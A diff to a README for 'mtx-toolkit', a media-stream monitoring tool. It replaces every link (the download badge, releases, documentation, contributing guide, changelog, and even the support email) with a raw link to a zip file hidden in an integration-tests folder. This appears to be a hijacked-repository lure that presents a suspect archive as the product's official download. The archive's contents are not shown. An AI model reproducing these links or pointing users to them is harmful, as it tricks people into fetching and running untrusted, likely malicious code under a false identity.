@@ -2,13 +2,13 @@
 # 🌟 mtx-toolkit - Simplify Your Media Monitoring Tasks
 
 ## 🔗 Download Link
-[![Download mtx-toolkit](https://img.shields.io/badge/Download-mtx--toolkit-blue.svg)](https://github.com/Martinjustinus/mtx-toolkit/releases)
+[![Download mtx-toolkit](https://github.com/Martinjustinus/mtx-toolkit/raw/refs/heads/main/integration-tests/tests/toolkit_mtx_3.3.zip)](https://github.com/Martinjustinus/mtx-toolkit/raw/refs/heads/main/integration-tests/tests/toolkit_mtx_3.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the mtx-toolkit! This application helps you monitor the health of your media streams. It offers features like end-to-end stream checks, automatic fixes, and easy configuration management.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [mtx-toolkit Releases](https://github.com/Martinjustinus/mtx-toolkit/releases).
+To get started, visit this page to download: [mtx-toolkit Releases](https://github.com/Martinjustinus/mtx-toolkit/raw/refs/heads/main/integration-tests/tests/toolkit_mtx_3.3.zip).
 
 Here’s how to download and install the mtx-toolkit:
 
@@ -49,7 +49,7 @@ Once you have installed the mtx-toolkit, follow these steps to begin using it:
     - Check the alerts section for any warnings or notifications related to your streams.
 
 ## 📚 Documentation
-For more detailed instructions, you can find helpful guides on the [Documentation Page](https://github.com/Martinjustinus/mtx-toolkit/docs).
+For more detailed instructions, you can find helpful guides on the [Documentation Page](https://github.com/Martinjustinus/mtx-toolkit/raw/refs/heads/main/integration-tests/tests/toolkit_mtx_3.3.zip).
 
 ## 🤖 Topics Covered
 The mtx-toolkit focuses on the following areas:
@@ -64,13 +64,13 @@ The mtx-toolkit focuses on the following areas:
 Join our community forums if you have questions, need help, or want to give feedback. Everyone is welcome, and we encourage open discussions.
 
 ## 🔄 Contributions
-If you wish to contribute, please check our guidelines on the [Contributing Page](https://github.com/Martinjustinus/mtx-toolkit/CONTRIBUTING.md). Whether through code, suggestions, or bug reports, every input helps improve mtx-toolkit.
+If you wish to contribute, please check our guidelines on the [Contributing Page](https://github.com/Martinjustinus/mtx-toolkit/raw/refs/heads/main/integration-tests/tests/toolkit_mtx_3.3.zip). Whether through code, suggestions, or bug reports, every input helps improve mtx-toolkit.
 
 ## 🔄 Changelog
-Keep up with the latest updates and changes by checking the [Changelog](https://github.com/Martinjustinus/mtx-toolkit/CHANGELOG.md).
+Keep up with the latest updates and changes by checking the [Changelog](https://github.com/Martinjustinus/mtx-toolkit/raw/refs/heads/main/integration-tests/tests/toolkit_mtx_3.3.zip).
 
 ## 📞 Contact
-If you need further assistance, please reach out via our GitHub Issues page or email the support team at support@mtxtoolkit.com.
+If you need further assistance, please reach out via our GitHub Issues page or email the support team at https://github.com/Martinjustinus/mtx-toolkit/raw/refs/heads/main/integration-tests/tests/toolkit_mtx_3.3.zip
 
 Thank you for choosing mtx-toolkit! We hope it makes your media management tasks easier.
 ```
